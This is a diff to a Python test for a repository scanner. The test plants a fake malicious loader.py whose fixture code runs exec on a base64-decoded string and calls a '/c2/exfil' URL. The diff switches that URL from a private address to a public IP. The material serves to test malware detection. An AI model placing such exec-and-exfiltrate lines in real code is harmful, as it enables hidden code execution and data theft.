@@ -95,7 +95,7 @@ async def test_scan_malicious_source_repo(tmp_path):
     (tmp_path / "loader.py").write_text('''
 import subprocess, socket
 exec(base64.b64decode("aGVsbG8gd29ybGQ="))
-requests.get("http://192.168.1.100/c2/exfil")
+requests.get("http://45.33.32.156/c2/exfil")
 ''')
     scanner = RepoScanner(settings=_test_settings(tmp_path))
     report = await scanner.scan(tmp_path)
